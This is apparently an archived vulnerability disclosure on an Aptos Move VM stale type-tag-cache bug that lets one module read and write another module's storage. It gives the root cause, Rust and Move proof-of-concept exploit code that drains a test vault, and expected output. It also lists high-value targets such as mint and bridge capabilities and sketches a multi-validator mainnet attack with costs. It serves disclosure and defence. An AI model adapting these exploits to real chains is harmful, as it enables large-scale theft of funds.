# 🔴 Critical Bug in Aptos Move VM Allowed Arbitrary Storage Hijack

- **Source URL:** https://hexens.io/research/aptos-hijack-bug
- **Fetched:** 2026-11-15
- **Channel:** @defendor_eng
- **Telegram message:** https://t.me/defendor_eng/1813 (id 1813)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
**INDEX COLLISION**

## 

While the local PoC works without complications, it works with only a single validator. The real-world exploitation comes with bigger issues, as the cache structures are in-memory objects and do not necessarily synchronize for multiple validators. A simple attack vector will most likely not succeed, as validators will have different struct indexes mapped, which can cause a chain halt. This section describes research on how to use strong primitives of the node to internally synchronize these caches and land a sophisticated multi-block attack in a real-world environment. We showcase how to use a deeper understanding of mempool, block production and epoch change mechanism to force-synchronize validators on these internal caches.

## 

The Move VM represents struct types internally using a compact integer index rather than their full qualified name (address + module + name). This is done for performance: comparing two integers is far cheaper than comparing three strings, and storing an integer per type reference is far smaller than cloning full identifiers everywhere.

The mapping between struct names and indices lives in `StructNameIndexMap`, defined in `move-vm/types/src/loaded_data/struct_name_indexing.rs`. It is a bidirectional map:

- **Forward**: `StructIdentifier` (address, module, name) -> `StructNameIndex` (a `u32`)
- **Backward**: `StructNameIndex` -> `StructIdentifier`

When a module is loaded, each of its struct definitions gets assigned a `StructNameIndex`. If that struct was already loaded before, it gets the same index. If not, it gets the next available integer. The index is then used everywhere inside the VM to refer to that struct type — in the type system (`Type::Struct { idx, .. }`), in the bytecode interpreter, in caches, etc.

The `StructNameIndexMap` is part of the `RuntimeEnvironment`, which is shared across all transactions in a block and persisted across blocks:

```
pub struct RuntimeEnvironment {
    vm_config: VMConfig,
    natives: NativeFunctions,
    struct_name_index_map: Arc<StructNameIndexMap>,
    ty_tag_cache: Arc<TypeTagCache>,
    interned_ty_pool: Arc<InternedTypePool>,
    interned_module_id_pool: Arc<InternedModuleIdPool>,
}
```
The `InternedModuleIdPool` is a similar interning structure, but for `ModuleId` values (address + module name). Each unique module ID gets an integer index. The pool grows as new modules are loaded.

## 

There is a second data structure that depends on `StructNameIndex` values: the `TypeTagCache`, defined in `move-vm/runtime/src/storage/ty_tag_converter.rs`.

When the VM needs to read or write a resource from storage, it must convert the internal `Type` representation (which uses `StructNameIndex`) into a `StructTag` (which uses the full string-based name). The `StructTag` is then BCS-serialized into an `AccessPath` that forms the `StateKey` — the actual byte-level key used to address storage slots.

This conversion goes through `TypeTagConverter::struct_name_idx_to_struct_tag_impl()`:

```
fn struct_name_idx_to_struct_tag_impl(
    &self,
    struct_name_idx: &StructNameIndex,
    ty_args: &[Type],
    gas_context: &mut PseudoGasContext,
) -> PartialVMResult<StructTag> {
    let ty_tag_cache = self.runtime_environment.ty_tag_cache();
    // If cached, return immediately.
    if let Some(priced_tag) = ty_tag_cache.get_struct_tag(struct_name_idx, ty_args) {
        gas_context.charge(priced_tag.pseudo_gas_cost)?;
        return Ok(priced_tag.struct_tag);
    }
    // Not cached — look up the full name from struct_name_index_map
    // and build the StructTag from scratch...
    let struct_name_index_map = self.runtime_environment.struct_name_index_map();
    let struct_tag = struct_name_index_map.idx_to_struct_tag(*struct_name_idx, type_args)?;
    // Cache it for next time.
    ty_tag_cache.insert_struct_tag(struct_name_idx, ty_args, &priced_tag);
    Ok(priced_tag.struct_tag)
}
```
The cache key is `(StructNameIndex, Vec<Type>)`. The cache value is the resolved `StructTag`. This cache exists purely for performance — resolving the full string name from the index map on every `borrow_global` would be expensive.

The safety argument documented in the source code is that a `StructNameIndex` is permanently bound to one `StructIdentifier`, so the cached `StructTag` is always correct for that index. This is true **as long as the index map and the cache are flushed together**.

## 

The `RuntimeEnvironment` persists across block boundaries. Over time, the interning structures grow: more modules get loaded, more struct names get indexed, more module IDs get interned. To prevent unbounded memory growth, the block executor periodically flushes these caches.

The flushing logic lives in `ModuleCacheManager::check_ready()` at `aptos-move/block-executor/src/code_cache_global_manager.rs`. This function runs at the beginning of each block, before any transactions execute. It checks several size thresholds and flushes caches that exceed them.

There are two relevant flush paths:

**Path A — struct name index map overflow** (line 142-144):

```
if struct_name_index_map_size > config.max_struct_name_index_map_num_entries {
    runtime_environment.flush_all_caches();
    self.module_cache.flush();
}
```
This calls `flush_all_caches()`, which is defined in `environment.rs`:

```
/// Flushes the global caches with struct name indices and struct tags.
pub fn flush_all_caches(&self) {
    self.ty_tag_cache.flush();
    self.struct_name_index_map.flush();
    self.interned_ty_pool.flush();
    self.interned_module_id_pool.flush();
}
```
This is correct. It flushes the type tag cache together with the struct name index map, so no stale entries can exist.

**Path B — module ID pool overflow** (line 161-165):

```
if num_interned_module_ids > config.max_interned_module_ids {
    runtime_environment.module_id_pool().flush();
    runtime_environment.struct_name_index_map().flush();
    self.module_cache.flush();
}
```
This path flushes the module ID pool and the struct name index map, **but does not flush the type tag cache**. It also flushes the module cache (which is necessary because loaded modules reference `StructNameIndex` values that are now invalid).

The default thresholds from `BlockExecutorModuleCacheLocalConfig`:

- `max_struct_name_index_map_num_entries`: 1,000,000
- `max_interned_module_ids`: 100,000

Since each module has on average a handful of structs, the module ID pool threshold (100K) is reached well before the struct name index map threshold (1M). This means **Path B fires first** in practice.

## 

After Path B fires:

- `struct_name_index_map` is **empty**. All `StructNameIndex -> StructIdentifier` mappings are gone. The next module load starts assigning indices from 0 again.
- `module_id_pool` is **empty**. Same deal.
- `module_cache` is **empty**. All loaded modules are gone. They will be re-loaded as needed.
- `ty_tag_cache` is **NOT empty**. It still contains every `(StructNameIndex, ty_args) -> StructTag` mapping from before the flush.

This is the invariant violation. The `ty_tag_cache` entries are keyed by `StructNameIndex` values that no longer correspond to the same struct names. When modules are reloaded after the flush, the struct name index map assigns fresh indices starting from 0. A struct that previously had index 5 might now have index 12, and a completely different struct might now have index 5.

If the type tag cache is consulted for a struct at its new index, and that index happens to match a stale cache entry from a different struct, the cache returns the wrong `StructTag`.

The call chain from `BorrowGlobal` to storage is:

```
BorrowGlobal(sd_idx)                                    [interpreter.rs]
  -> interpreter.borrow_global(addr, &ty: Type)
    -> self.load_resource_mut(data_cache, addr, ty)
      -> TransactionDataCache::create_data_cache_entry()
        -> runtime_environment.ty_to_ty_tag(ty)          <-- uses ty_tag_cache
          -> TypeTagConverter::struct_name_idx_to_struct_tag_impl()
            -> ty_tag_cache.get_struct_tag(idx, ty_args)  <-- STALE HIT
        = struct_tag (WRONG)
        -> resource_resolver.get_resource_bytes(&struct_tag)
          -> StateKey::resource(address, struct_tag)       <-- wrong storage key
```
The stale `StructTag` is BCS-serialized into the `StateKey`. The VM reads bytes from a storage slot belonging to a completely different struct type.

## 

BCS (Binary Canonical Serialization) is a positional format. It does not include type tags, field names, or any metadata in the serialized bytes. A `struct Foo { x: u64 }` and a `struct Bar { y: u64 }` produce identical bytes when their field values are the same.

When the VM reads bytes from the wrong storage slot (because the `StructTag` in the `StateKey` is wrong), it deserializes those bytes using the type layout of the struct that the *current transaction* declared. If the layouts happen to be compatible — same number of fields, same primitive types in the same order — the deserialization succeeds silently.

The VM now holds an in-memory value whose runtime type is the attacker's struct, but whose underlying data came from the victim's storage slot. The bytecode verifier has no way to detect this — it verified the attacker's code against the attacker's type definitions, and all the field accesses are valid for the attacker's types. The confusion is purely at the storage layer, below the verifier's visibility.

After the attacker's code modifies fields (perfectly valid operations on its own type), the VM serializes the modified value back using the same stale `StateKey` — writing the changes to the victim's storage slot.

## 

The attack generalizes beyond simple structs. The target determines the complexity.

### 

Most DeFi protocols store critical state in non-generic structs:

```
struct PoolAccountCapability has key {
    signer_cap: SignerCapability,
}
```
The attacker matches this with a single `StructNameIndex` alignment. The attacker's fake struct has the same field layout. After stealing the `SignerCapability`, the attacker can call `create_signer_with_capability()` to obtain the pool's signer — equivalent to having the pool's private key.

### 

For a generic struct like `CoinStore<CoinType>`, the type tag cache key includes the type arguments: `(StructNameIndex_of_CoinStore, [Type::Struct { idx: StructNameIndex_of_CoinType }])`. The attacker needs to align both the outer struct's index and each type parameter's index. This requires more padding modules but is still deterministic.

### 

Some structs are annotated with `#[resource_group_member(group = ObjectGroup)]`. These are stored differently: multiple resource group members at the same address are packed into a single storage slot keyed by the group tag.

When the VM loads a resource group member, it:

1. Checks the struct's module metadata to find the resource group annotation.
2. Uses the group tag as the outer storage key.
3. Uses the struct's `StructTag` as an inner key within the group's `BTreeMap`.

The metadata lookup uses the struct's **name** (not its index). This means for resource group members, the attacker must also name their fake struct identically to the target and declare it as a member of the same group. This is trivially achievable — there is no restriction on naming a struct `State` or `ObjectController` in the attacker's own module.

### 

The most dangerous targets are structs that hold capability objects:

- `SignerCapability` — generates a signer for a resource account, equivalent to a private key
- `MintRef` / `BurnRef` — minting and burning authority for fungible assets
- `UaCapability<T>` — authorization to send cross-chain messages via LayerZero
- `EmitterCapability` — authorization to publish Wormhole messages
- `ExtendRef` — generates a signer for an object, used by Circle CCTP

Stealing any of these gives the attacker protocol-level control that cannot be revoked without a contract upgrade (and some contracts are immutable).

## 

### 

Two small changes are required to the test infrastructure to enable the PoC. These changes are test-only and do not modify production code.

**1. Allow tests to override the module cache flush threshold.**

The production default for `max_interned_module_ids` is 100,000. Reaching this in a test would require publishing 100K modules, which is slow. Instead, we add a test-only setter on `FakeExecutor` to lower the threshold to 20, so that the Aptos framework alone (which loads \~60+ modules) exceeds it in a single block.

In `aptos-move/e2e-tests/src/executor.rs`, add a `module_cache_config` field and setter to `FakeExecutorImpl`:

```
// In the FakeExecutorImpl struct definition:
#[cfg(test)]
module_cache_config: Option<BlockExecutorModuleCacheLocalConfig>,
// Initialize to None in all constructors:
#[cfg(test)]
module_cache_config: None,
// Add a setter method:
#[cfg(test)]
pub fn set_module_cache_config(&mut self, config: BlockExecutorModuleCacheLocalConfig) {
    self.module_cache_config = Some(config);
}
// In execute_block_impl, use it when building BlockExecutorConfig:
module_cache_config: {
    #[cfg(test)]
    { self.module_cache_config.clone().unwrap_or_default() }
    #[cfg(not(test))]
    { BlockExecutorModuleCacheLocalConfig::default() }
},
```
In `types/src/block_executor/config.rs`, add a builder method:

```
impl BlockExecutorModuleCacheLocalConfig {
    pub fn with_max_module_ids(mut self, max: usize) -> Self {
        self.max_interned_module_ids = max;
        self
    }
}
```
**2. Increase the Rust thread stack size.**

The Move compiler uses deep recursion during package builds. The default test thread stack (2 MB on most platforms) overflows when compiling Move packages inside the E2E test. Set the `RUST_MIN_STACK` environment variable to 8 MB:

```
export RUST_MIN_STACK=8388608
```
With these in place, the unit test and E2E test below both pass.

### 

This test directly demonstrates the stale cache returning the wrong `StructTag` after a partial flush:

```
#[test]
fn test_stale_ty_tag_cache_after_partial_flush() {
    let runtime_environment = RuntimeEnvironment::new(vec![]);
    // ── Phase 1: Victim's struct gets StructNameIndex(0) ──
    let victim_module_id =
        ModuleId::new(AccountAddress::ONE, Identifier::new("victim").unwrap());
    let victim_struct_id = StructIdentifier::new(
        runtime_environment.module_id_pool(),
        victim_module_id,
        Identifier::new("Vault").unwrap(),
    );
    let victim_idx = runtime_environment
        .struct_name_index_map()
        .struct_name_to_idx(&victim_struct_id)
        .unwrap();
    // Resolve StructTag — this populates the ty_tag_cache.
    let converter = TypeTagConverter::new(&runtime_environment);
    let mut gas_ctx = PseudoGasContext::new(runtime_environment.vm_config());
    let victim_tag = assert_ok!(
        converter.struct_name_idx_to_struct_tag_impl(&victim_idx, &[], &mut gas_ctx)
    );
    let expected_victim_tag = StructTag::from_str("0x1::victim::Vault").unwrap();
    assert_eq!(victim_tag, expected_victim_tag);
    // Confirm the cache entry exists.
    assert_some!(runtime_environment
        .ty_tag_cache()
        .get_struct_tag(&victim_idx, &[]));
    // ── Phase 2: Partial flush — the bug at code_cache_global_manager.rs:161-165 ──
    //
    // Flushes module_id_pool + struct_name_index_map but NOT ty_tag_cache.
    // This is the exact sequence from the buggy code path:
    //
    //   runtime_environment.module_id_pool().flush();
    //   runtime_environment.struct_name_index_map().flush();
    //   // BUG: ty_tag_cache is NOT flushed!
    //
    // Compare with the CORRECT path at line 142-144:
    //   runtime_environment.flush_all_caches();  // includes ty_tag_cache.flush()
    runtime_environment.module_id_pool().flush();
    runtime_environment.struct_name_index_map().flush();
    // Confirm struct_name_index_map is empty after flush.
    assert_eq!(
        assert_ok!(runtime_environment.struct_name_index_map_size()),
        0
    );
    // Confirm ty_tag_cache still has the stale entry (this is the bug).
    assert_some!(
        runtime_environment
            .ty_tag_cache()
            .get_struct_tag(&victim_idx, &[]),
        "ty_tag_cache should still have the stale entry after partial flush"
    );
    // ── Phase 3: Attacker's struct gets RECYCLED StructNameIndex(0) ──
    let attacker_module_id = ModuleId::new(
        AccountAddress::from_hex_literal("0xdead").unwrap(),
        Identifier::new("attacker").unwrap(),
    );
    let attacker_struct_id = StructIdentifier::new(
        runtime_environment.module_id_pool(),
        attacker_module_id,
        Identifier::new("FakeVault").unwrap(),
    );
    let attacker_idx = runtime_environment
        .struct_name_index_map()
        .struct_name_to_idx(&attacker_struct_id)
        .unwrap();
    // CRITICAL: Attacker gets the SAME StructNameIndex as victim.
    assert_eq!(
        victim_idx, attacker_idx,
        "After flush, StructNameIndex is recycled — attacker gets victim's index"
    );
    // ── Phase 4: THE BUG — resolve StructTag for attacker's struct ──
    let converter = TypeTagConverter::new(&runtime_environment);
    let mut gas_ctx = PseudoGasContext::new(runtime_environment.vm_config());
    let resolved_tag = assert_ok!(
        converter.struct_name_idx_to_struct_tag_impl(&attacker_idx, &[], &mut gas_ctx)
    );
    let expected_attacker_tag =
        StructTag::from_str("0xdead::attacker::FakeVault").unwrap();
    // BUG: The resolved tag is the VICTIM's tag, not the attacker's!
    // This StructTag becomes the StateKey for BorrowGlobal, meaning the VM
    // reads the VICTIM's storage slot when accessing the attacker's type.
    assert_eq!(
        resolved_tag, expected_victim_tag,
        "BUG: Stale ty_tag_cache returns VICTIM's StructTag for ATTACKER's struct!"
    );
    assert_ne!(
        resolved_tag, expected_attacker_tag,
        "BUG: Attacker does NOT get their own StructTag — gets victim's instead!"
    );
    // ── Phase 5: Prove the CORRECT behavior with full flush ──
    runtime_environment.flush_all_caches(); // This is what line 142-144 does.
    let attacker_module_id_v2 = ModuleId::new(
        AccountAddress::from_hex_literal("0xdead").unwrap(),
        Identifier::new("attacker").unwrap(),
    );
    let attacker_struct_id = StructIdentifier::new(
        runtime_environment.module_id_pool(),
        attacker_module_id_v2,
        Identifier::new("FakeVault").unwrap(),
    );
    let attacker_idx_v2 = runtime_environment
        .struct_name_index_map()
        .struct_name_to_idx(&attacker_struct_id)
        .unwrap();
    let converter = TypeTagConverter::new(&runtime_environment);
    let mut gas_ctx = PseudoGasContext::new(runtime_environment.vm_config());
    let correct_tag = assert_ok!(
        converter.struct_name_idx_to_struct_tag_impl(&attacker_idx_v2, &[], &mut gas_ctx)
    );
    // After full flush (including ty_tag_cache), the correct tag is returned.
    assert_eq!(
        correct_tag, expected_attacker_tag,
        "After flush_all_caches (which includes ty_tag_cache), correct StructTag is returned"
    );
}
```
### 

This test runs two blocks through the real Aptos block executor, demonstrating that the stale type tag cache causes one module's `borrow_global_mut` to read and write another module's storage slot.

**Victim module:**

```
module victim::vault {
    struct Vault has key {
        value: u64,
    }
    public entry fun create_vault(account: &signer, v: u64) {
        move_to(account, Vault { value: v });
    }
    #[view]
    public fun get_value(addr: address): u64 acquires Vault {
        borrow_global<Vault>(addr).value
    }
}
```
**Attacker module:**

```
module attacker::exploit {
    struct FakeVault has key {
        value: u64,
    }
    public entry fun steal(victim_addr: address, new_val: u64) acquires FakeVault {
        borrow_global_mut<FakeVault>(victim_addr).value = new_val;
    }
}
```
**Test harness:**

```
#[cfg(test)]
mod tests {
    use crate::{
        account::Account,
        executor::FakeExecutor,
    };
    use aptos_block_executor::code_cache_global_manager::AptosModuleCacheManager;
    use aptos_cached_packages::aptos_stdlib;
    use aptos_framework::{BuildOptions, BuiltPackage};
    use aptos_transaction_simulation::GENESIS_CHANGE_SET_HEAD;
    use aptos_types::{
        account_address::AccountAddress,
        block_executor::config::BlockExecutorModuleCacheLocalConfig,
        chain_id::ChainId,
        state_store::state_key::StateKey,
        transaction::{EntryFunction, ExecutionStatus, TransactionPayload, TransactionStatus},
    };
    use move_core_types::{
        identifier::Identifier,
        language_storage::{ModuleId, StructTag},
    };
    use std::{path::PathBuf, sync::Arc};
    fn workspace_root() -> PathBuf {
        let manifest = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
        manifest
            .parent()
            .unwrap()
            .parent()
            .unwrap()
            .to_path_buf()
    }
    fn build_publish_txn(
        account: &Account,
        package_path: PathBuf,
        seq_num: u64,
    ) -> aptos_types::transaction::SignedTransaction {
        let package =
            BuiltPackage::build(package_path, BuildOptions::default())
                .expect("building package must succeed");
        let code = package.extract_code();
        let metadata = package
            .extract_metadata()
            .expect("extracting package metadata must succeed");
        account
            .transaction()
            .sequence_number(seq_num)
            .max_gas_amount(2_000_000)
            .gas_unit_price(100)
            .payload(aptos_stdlib::code_publish_package_txn(
                bcs::to_bytes(&metadata).expect("PackageMetadata has BCS"),
                code,
            ))
            .sign()
    }
    fn build_entry_function_txn(
        account: &Account,
        module_addr: AccountAddress,
        module_name: &str,
        function_name: &str,
        args: Vec<Vec<u8>>,
        seq_num: u64,
    ) -> aptos_types::transaction::SignedTransaction {
        account
            .transaction()
            .sequence_number(seq_num)
            .max_gas_amount(2_000_000)
            .gas_unit_price(100)
            .payload(TransactionPayload::EntryFunction(EntryFunction::new(
                ModuleId::new(module_addr, Identifier::new(module_name).unwrap()),
                Identifier::new(function_name).unwrap(),
                vec![],
                args,
            )))
            .sign()
    }
    /// Executes a block of transactions, applies all successful write sets, and returns
    /// the outputs. Panics on VM errors.
    fn execute_block_and_apply(
        executor: &mut FakeExecutor,
        txns: Vec<aptos_types::transaction::SignedTransaction>,
    ) -> Vec<aptos_types::transaction::TransactionOutput> {
        let outputs = executor
            .execute_block(txns)
            .expect("block execution must not fail at VM level");
        for output in &outputs {
            if matches!(output.status(), TransactionStatus::Keep(_)) {
                executor.apply_write_set(output.write_set());
            }
        }
        outputs
    }
    /// Core PoC: demonstrates storage-level type confusion via stale ty_tag_cache.
    ///
    /// The test runs two blocks through the real Aptos block executor:
    ///   Block 1: Publish victim module + create Vault { value: 42424242 }
    ///   Block 2: Partial cache flush fires, then attacker publishes a module with
    ///            identical layout. The attacker calls borrow_global_mut<FakeVault>
    ///            on the victim's address. Due to the stale ty_tag_cache, the VM
    ///            resolves FakeVault's StructTag to the victim's Vault StructTag,
    ///            reads the victim's Vault bytes, and writes them back modified.
    #[test]
    fn test_ty_tag_cache_storage_type_confusion() {
        let victim_addr =
            AccountAddress::from_hex_literal("0xcafe").unwrap();
        let attacker_addr =
            AccountAddress::from_hex_literal("0xdead").unwrap();
        // -- Set up executor with Fuzzing mode (cache persistence across blocks) --
        let tp = Arc::new(
            rayon::ThreadPoolBuilder::new()
                .num_threads(1)
                .build()
                .unwrap(),
        );
        let mut executor = FakeExecutor::from_genesis_with_existing_thread_pool(
            GENESIS_CHANGE_SET_HEAD.clone().write_set(),
            ChainId::test(),
            tp,
            Some(AptosModuleCacheManager::new()),
        );
        // Lower max_interned_module_ids so the framework alone exceeds it in Block 1,
        // triggering the partial flush at the start of Block 2.
        executor.set_module_cache_config(
            BlockExecutorModuleCacheLocalConfig::default().with_max_module_ids(20),
        );
        // Create funded accounts at deterministic addresses.
        let victim_account = executor.new_account_at(victim_addr);
        let attacker_account = executor.new_account_at(attacker_addr);
        let root = workspace_root();
        let victim_pkg = root.join("poc/ty_tag_cache_exploit/victim");
        let attacker_pkg = root.join("poc/ty_tag_cache_exploit/attacker");
        // ====================================================================
        // BLOCK 1: Publish victim module + create Vault { value: 42424242 }
        // ====================================================================
        let publish_victim_txn = build_publish_txn(&victim_account, victim_pkg, 0);
        let create_vault_txn = build_entry_function_txn(
            &victim_account,
            victim_addr,
            "vault",
            "create_vault",
            vec![bcs::to_bytes(&42424242u64).unwrap()],
            1,
        );
        println!("[BLOCK 1] Publishing victim module and creating Vault {{ value: 42424242 }}");
        let outputs = execute_block_and_apply(&mut executor, vec![
            publish_victim_txn,
            create_vault_txn,
        ]);
        assert!(
            matches!(
                outputs[0].status(),
                TransactionStatus::Keep(ExecutionStatus::Success)
            ),
            "victim publish failed: {:?}",
            outputs[0].status()
        );
        assert!(
            matches!(
                outputs[1].status(),
                TransactionStatus::Keep(ExecutionStatus::Success)
            ),
            "create_vault failed: {:?}",
            outputs[1].status()
        );
        // Verify the resource was created by reading directly from state.
        let vault_tag = StructTag {
            address: victim_addr,
            module: Identifier::new("vault").unwrap(),
            name: Identifier::new("Vault").unwrap(),
            type_args: vec![],
        };
        let state_key = StateKey::resource(&victim_addr, &vault_tag)
            .expect("state key construction must succeed");
        let bytes_before = executor
            .read_state_value_bytes(&state_key)
            .expect("Vault resource must exist after create_vault");
        let value_before: u64 = bcs::from_bytes(&bytes_before).unwrap();
        assert_eq!(
            value_before, 42424242,
            "Vault value should be 42424242 after creation"
        );
        println!(
            "[BLOCK 1] Vault resource verified at victim addr: value = {}",
            value_before
        );
        // ====================================================================
        // BLOCK 2: Partial flush fires, then attacker exploits stale cache
        //
        // At the start of this block, check_ready() in code_cache_global_manager
        // sees num_interned_module_ids > 20 (from Block 1's framework loading).
        // It flushes module_id_pool + struct_name_index_map + module_cache,
        // but DOES NOT flush ty_tag_cache (the bug at line 161-165).
        //
        // The attacker's FakeVault struct will receive a recycled StructNameIndex
        // that previously belonged to the victim's Vault. The stale ty_tag_cache
        // maps this index to the victim's StructTag, causing BorrowGlobal to
        // read the victim's storage slot.
        // ====================================================================
        let publish_attacker_txn = build_publish_txn(&attacker_account, attacker_pkg, 0);
        let steal_txn = build_entry_function_txn(
            &attacker_account,
            attacker_addr,
            "exploit",
            "steal",
            vec![
                bcs::to_bytes(&victim_addr).unwrap(),
                bcs::to_bytes(&0u64).unwrap(),
            ],
            1,
        );
        println!("[BLOCK 2] Partial flush expected. Publishing attacker module and executing steal.");
        let outputs = execute_block_and_apply(&mut executor, vec![
            publish_attacker_txn,
            steal_txn,
        ]);
        assert!(
            matches!(
                outputs[0].status(),
                TransactionStatus::Keep(ExecutionStatus::Success)
            ),
            "attacker publish failed: {:?}",
            outputs[0].status()
        );
        // The steal transaction outcome tells us whether the stale cache was hit:
        //  - Success → stale cache returned the victim's StructTag, VM found and
        //              modified the victim's Vault bytes through FakeVault.
        //  - Abort/Failure → the StructNameIndex did not align (need padding).
        let steal_status = outputs[1].status();
        println!("[BLOCK 2] steal transaction status: {:?}", steal_status);
        if matches!(steal_status, TransactionStatus::Keep(ExecutionStatus::Success)) {
            // Read the victim's Vault resource again.
            let bytes_after = executor
                .read_state_value_bytes(&state_key)
                .expect("Vault resource must still exist");
            let value_after: u64 = bcs::from_bytes(&bytes_after).unwrap();
            println!(
                "[RESULT] Vault value BEFORE exploit: {}, AFTER exploit: {}",
                value_before, value_after
            );
            assert_eq!(
                value_after, 0,
                "EXPLOIT CONFIRMED: Victim's Vault value was modified from {} to 0 \
                 through the attacker's FakeVault type. The ty_tag_cache returned a \
                 stale StructTag, causing BorrowGlobal<FakeVault> to read/write the \
                 victim's Vault storage slot.",
                value_before,
            );
            println!("==============================================");
            println!("  ty_tag_cache EXPLOIT PoC: CONFIRMED");
            println!("  Victim Vault value changed: {} -> 0", value_before);
            println!("  Attacker never had access to victim::vault::Vault type");
            println!("==============================================");
        } else {
            // If the steal failed, the StructNameIndex didn't align in this run.
            // Print diagnostic information for debugging.
            println!(
                "[DIAGNOSTIC] steal transaction did not succeed: {:?}. \
                 StructNameIndex alignment may need padding modules.",
                steal_status
            );
            println!(
                "[DIAGNOSTIC] This can happen if the framework loads a different \
                 number of structs in Block 2 vs Block 1. Add padding modules \
                 before the attacker's publish to shift the StructNameIndex."
            );
            // Even a failure with RESOURCE_DOES_NOT_EXIST at the attacker's
            // address proves the cache was NOT stale (the correct behavior).
            // A failure with a different error might indicate partial alignment.
            panic!(
                "Steal transaction failed with: {:?}. \
                 Index alignment needs adjustment — see diagnostics above.",
                steal_status
            );
        }
    }
}
```
Expected output:

```
[BLOCK 1] Publishing victim module and creating Vault { value: 42424242 }
[BLOCK 1] Vault resource verified at victim addr: value = 42424242
[BLOCK 2] Partial flush expected. Publishing attacker module and executing steal.
[BLOCK 2] steal transaction status: Keep(Success)
[RESULT] Vault value BEFORE exploit: 42424242, AFTER exploit: 0
==============================================
  ty_tag_cache EXPLOIT PoC: CONFIRMED
  Victim Vault value changed: 42424242 -> 0
  Attacker never had access to victim::vault::Vault type
==============================================
```
## 

Any on-chain resource stored in a user-defined struct is vulnerable. The attacker can read and write arbitrary fields of any resource whose BCS layout they can match. This includes:

- **Direct fund theft**: Modify balance fields in DeFi vaults, lending pools, staking contracts.
- **Capability theft**: Steal `SignerCapability`, `MintRef`, `BurnRef`, or any admin capability stored in a custom struct. This gives the attacker permanent control of the protocol's resource account (equivalent to having the private key).
- **Cross-chain amplification**: Bridge protocols on Aptos (LayerZero, Wormhole, Circle CCTP) store their sending capabilities in non-generic structs. Stealing these lets the attacker forge cross-chain messages that get signed by the real attestation infrastructure (Wormhole Guardians, LayerZero oracles, Circle attesters) and processed on destination chains. The blast radius extends to every chain the bridge connects to.
- **Stablecoin minting**: USDC and USDT on Aptos store mint capabilities in custom structs. Stealing these enables unlimited minting.

Framework types (e.g., `CoinStore<APT>`, `FungibleStore`) are not directly vulnerable because the framework is loaded first after every flush, so its indices are deterministic and stable. However, generic framework types instantiated with user-defined type parameters (e.g., `CoinStore<CustomToken>`) are vulnerable if the type parameter's index is recycled.

The trigger cost is modest. Publishing \~100,000 minimal modules (one function, one struct each) to push past the `max_interned_module_ids` threshold costs roughly 500-1000 APT in gas. This can be spread across multiple blocks.

### 

This flaw lives in the execution layer, not in any single contract. Every application on Aptos inherits the guarantees of the Move VM, and Move's security model rests on the runtime enforcing type and resource safety faithfully. Protocols build on that assumption. In large part it is why they choose Move.

Once type safety can be violated at the VM level, that assumption no longer holds. A contract can be correctly written, fully audited, and still have its state hijacked from beneath it. Diligence at the application layer does not bound the exposure, because the flaw sits below the application entirely.

The value at risk is therefore not scoped to any one protocol. It extends to every asset and system whose integrity ultimately depends on this layer, including major stablecoin issuers and cross-chain bridges holding billions in combined value on Aptos. None of these parties could have closed the gap through their own code or process. That is the nature of a base-layer vulnerability: trust placed anywhere above it is only as sound as the runtime underneath.

## 

## 

Aptos has a good amount of safety, self-healing, fairness other robustness mechanisms. This exploiation method leverages these mechanism in the attacks favor to have very high reliability of attack success and no practical chances of divergence.

Test setup is done by deliberately overexagarrating the harmful conditions for the attack: organic traffic simulation designed so that its harmful for the attack, deliberately planting harmful txs into different phases of attack, resource-short conditions, fragile consensus (if just one validator stalls - chain halts), etc. - so that the test shows that the attack mechanism is not a fragile/unstable equilibrium but instead is very robust even in the noisy mainnet environment.

This is an end-to-end exploit test that spins up a local swarm of Aptos validator nodes with parallel execution enabled (concurrency level) and demonstrates a complete, silent fund drain against an arbitrary on-chain vault. The test emulates realistic network conditions: organic traffic runs continuously at \~40–50 TPS (matching observed Aptos mainnet averages), while the attack is exactly designed to rule those out (see further attack explanation) the test deliberately injects harmful struct-touching transactions into every attack phase to stress-test the exploit's resilience against interference.

It is designed to mostly succeed (18-20/20 test runs) or to miss (1-2/20) but practically never cause chain halt - and it has not been observed in the final tests at all.
The final statistical test shows for the 18-20 out of 20 runs, the vault is drained from 1,000,000 to 0. In the remaining 1-2 runs, the
attack misses cleanly — the vault stays intact, and the chain continues operating normally.
**No consensus divergence was observed in any run.** No validator crashes, no chain halts, no
state forks. The attack either drains or does nothing - giving a possibility to retry in 2h.

The test uses conservative gas
brackets and moderate account counts to keep execution fast. A real attacker would use extreme
gas prices and more struct variants, pushing the success rate even higher [Potential Improvements](https://hexens.io#8-potential-exploit-improvements)).

## 

### 

```
poc/
  e2e_attack/
    victim/sources/vault.move          # Target contract: holds a VaultState with 1,000,000 balance
    attacker/sources/toucher.move      # Touch module: loads VaultState into TTC at target epoch
    attacker/sources/pad.move          # Padding structs to control struct-name-index positioning
    exploit_pkg/sources/exploit.move   # 95 StolenState variants + steal entry functions
    organic_pkg/sources/organic.move   # Simulated organic traffic (counter increments)
testsuite/smoke-test/src/aptos/ty_tag_exploit_e2e.rs   # Full E2E test harness
types/src/block_executor/config.rs                      # Module interning threshold config
```
### 

```
ulimit -n 65535 # this probably will be needed to run 3 nodes on one machine under high pressure
# Basic run with defaults (works on most machines):
cargo test -p smoke-test -- test_ty_tag_full_attack --nocapture
# Do dry-run calibration (test will run 2-3x longer)
ATTACK_WARMUP= ATTACK_INFLATE= ATTACK_STEAL= \
  cargo test -p smoke-test -- test_ty_tag_full_attack --nocapture
# With diagnostics enabled for easier debug (writes per-validator cache logs to /tmp) -- this will need to add small logger code into node, I can provide the snippets if needed:
ATTACK_DIAG=1 cargo test -p smoke-test -- test_ty_tag_full_attack --nocapture
```
### 

The attack requires inflating the module ID pool past `max_interned_module_ids` to trigger
Path B. The production value is **100,000**. For the PoC test, this is lowered to **10,000**.

**Where the threshold is configured:**

The threshold lives in `types/src/block_executor/config.rs`, in the `Default` implementation
of `BlockExecutorModuleCacheLocalConfig`:

```
// File: types/src/block_executor/config.rs, line ~59
max_interned_module_ids: 10_000,   // PoC value (mainnet: 100_000)
```
**This is not a simplification of the attack itself** — the exploit mechanism is identical at
any threshold. The reduction exists because running 3 full Aptos validator nodes on a single
machine is resource-intensive when transaction burst comes in. I have tested at the 100K threshold, but it takes 1-2h of setup, as the test would need to deploy a lot more so it just hardware constraint (disk I/O, CPU contention between colocated validators) rather than any property of the vulnerability.

In a real attack on mainnet (threshold = 100,000), the attacker would simply do the slower setup - importantly even the attack's transaction count doesnt need to be changed.

### 

